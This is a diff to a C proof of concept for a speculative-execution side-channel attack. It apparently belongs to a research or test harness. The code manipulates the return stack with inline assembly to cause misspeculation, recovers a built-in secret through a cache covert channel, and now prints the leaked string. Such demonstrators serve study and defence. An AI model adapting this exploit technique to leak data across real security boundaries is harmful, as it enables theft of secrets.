@@ -16,22 +16,17 @@ int idx;
 // Pop return address from the software stack, causing misspeculation when hitting the return
 int __attribute__((noinline)) call_manipulate_stack()
 {
-    if (try_start())
-    {
 #if defined(__i386__) || defined(__x86_64__)
-        asm volatile("pop %%rax\n"
-                     :
-                     :
-                     : "rax");
+    asm volatile("pop %%rax\n"
+                 :
+                 :
+                 : "rax");
 #elif defined(__aarch64__)
-        asm volatile("ldp x29, x30, [sp],#16\n"
-                     :
-                     :
-                     : "x29");
+    asm volatile("ldp x29, x30, [sp],#16\n"
+                 :
+                 :
+                 : "x29");
 #endif
-        try_abort();
-    }
-    try_end();
     return 0;
 }
 
@@ -83,6 +78,8 @@ int main(int argc, char **argv)
 
         // Recover data from covert channel
         cache_decode_array(leaked, idx);
+
+        sched_yield();
     }
     for (int i = 0; i < sizeof(SECRET) - 1; i++)
     {
@@ -91,7 +88,7 @@ int main(int argc, char **argv)
             passed_count++;
         }
     }
-    // puts(leaked);
+    puts(leaked);
     int exit_result = 0;
     if (passed_count > 0)
     {
